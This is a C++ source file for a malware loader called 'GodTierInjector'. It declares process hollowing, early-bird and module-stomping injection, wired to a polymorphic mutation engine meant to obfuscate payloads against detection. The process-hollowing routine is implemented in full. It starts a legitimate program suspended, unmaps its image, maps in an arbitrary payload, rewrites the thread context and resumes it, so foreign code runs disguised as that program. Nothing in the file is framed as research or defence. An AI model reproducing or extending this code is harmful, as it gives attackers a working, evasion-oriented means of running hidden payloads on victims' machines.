// =============================================
// GOD TIER INJECTOR v2.1 - WITH ERROR HANDLING
// Smart mutation + proper error handling
// =============================================

#include <string>
#include <optional>

class GodTierInjector {
public:
    explicit GodTierInjector(UltimateBlackMutationEngine& engine);

    // Настройка
    void SetMutationParams(const UltimateBlackMutationEngine::EngineParams& params);
    void EnableAutoMutation(bool enable);
    void SetGlobalMutationIntensity(int intensity);

    // === Публичные методы с обработкой ошибок ===
    bool ProcessHollowingInject(const std::wstring& targetPath,
                                const std::vector<uint8_t>& rawData,
                                bool applyMutation = true);

    bool EarlyBirdInject(const std::wstring& targetPath,
                         const std::vector<uint8_t>& rawData,
                         bool applyMutation = true);

    bool ModuleStompingInject(const std::wstring& legitimateDllPath,
                              const std::vector<uint8_t>& rawData,
                              bool applyMutation = true,
                              PVOID* executionAddress = nullptr);

    bool RemoteModuleStompingInject(DWORD targetPid,
                                    const std::wstring& moduleName,
                                    const std::vector<uint8_t>& rawData,
                                    bool applyMutation = true);

    bool ExecuteStompedModule(PVOID address, bool wait = false);

    // Работа с ошибками
    std::string GetLastErrorMessage() const;
    void ClearLastError();

private:
    UltimateBlackMutationEngine& mutationEngine;
    UltimateBlackMutationEngine::EngineParams baseParams;
    bool autoMutationEnabled = true;
    std::string lastErrorMessage;

    void SetLastError(const std::string& message);
    bool CheckSyscallResult(NTSTATUS status, const std::string& operation);

    UltimateBlackMutationEngine::EngineParams GetSmartMutationParams(InjectionType type);
    std::vector<uint8_t> PreparePayload(const std::vector<uint8_t>& rawData,
                                        InjectionType type,
                                        bool applyMutation);
};

// ==================== РЕАЛИЗАЦИЯ ====================

GodTierInjector::GodTierInjector(UltimateBlackMutationEngine& engine)
    : mutationEngine(engine) 
{
    // Устанавливаем разумные дефолтные параметры
    baseParams.mutationIntensity = 6;
    baseParams.garbageDensity = 15;
    baseParams.enableFullMBA = true;
}

void GodTierInjector::SetLastError(const std::string& message) {
    lastErrorMessage = message;
}

std::string GodTierInjector::GetLastErrorMessage() const {
    return lastErrorMessage;
}

void GodTierInjector::ClearLastError() {
    lastErrorMessage.clear();
}

bool GodTierInjector::CheckSyscallResult(NTSTATUS status, const std::string& operation) {
    if (status != 0) {
        SetLastError("Syscall failed in " + operation + " (NTSTATUS: 0x" + 
                     std::to_string(status) + ")");
        return false;
    }
    return true;
}

// ==================== ПРИМЕР РЕАЛИЗАЦИИ МЕТОДА С ОБРАБОТКОЙ ОШИБОК ====================

bool GodTierInjector::ProcessHollowingInject(const std::wstring& targetPath,
                                             const std::vector<uint8_t>& rawData,
                                             bool applyMutation) 
{
    ClearLastError();

    if (rawData.empty()) {
        SetLastError("Empty payload provided");
        return false;
    }

    auto mutatedData = PreparePayload(rawData, InjectionType::ProcessHollowing, applyMutation);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        SetLastError("Failed to create suspended process");
        return false;
    }

    // Получаем контекст
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        SetLastError("Failed to get thread context");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    PVOID oldBase = nullptr;
    PVOID remotePeb = (PVOID)ctx.Rdx;

    // Читаем старый ImageBase
    if (!ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)remotePeb + 0x10), 
                           &oldBase, sizeof(PVOID), nullptr)) {
        SetLastError("Failed to read remote PEB");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Unmap оригинальный образ
    NTSTATUS status = g_NtUnmapViewOfSection(pi.hProcess, oldBase);
    if (!CheckSyscallResult(status, "NtUnmapViewOfSection")) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Allocate память
    PVOID newBase = nullptr;
    SIZE_T regionSize = mutatedData.size() + 0x2000;
    status = g_NtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &regionSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!CheckSyscallResult(status, "NtAllocateVirtualMemory")) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    PVOID entryPoint = nullptr;

    // Маппим PE
    if (!MapPEIntoProcess(pi.hProcess, newBase, mutatedData, entryPoint)) {
        SetLastError("Failed to map PE into target process");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Фиксим релокейшены
    auto dos = (PIMAGE_DOS_HEADER)mutatedData.data();
    auto nt  = (PIMAGE_NT_HEADERS)(mutatedData.data() + dos->e_lfanew);
    PVOID preferredBase = (PVOID)nt->OptionalHeader.ImageBase;

    if (!FixRelocations(pi.hProcess, newBase, preferredBase)) {
        SetLastError("Failed to fix relocations");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Обновляем PEB и контекст
    if (!UpdatePEBAndContext(pi.hProcess, pi.hThread, newBase, entryPoint)) {
        SetLastError("Failed to update PEB and context");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Resume
    status = g_NtResumeThread(pi.hThread, nullptr);
    if (!CheckSyscallResult(status, "NtResumeThread")) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}
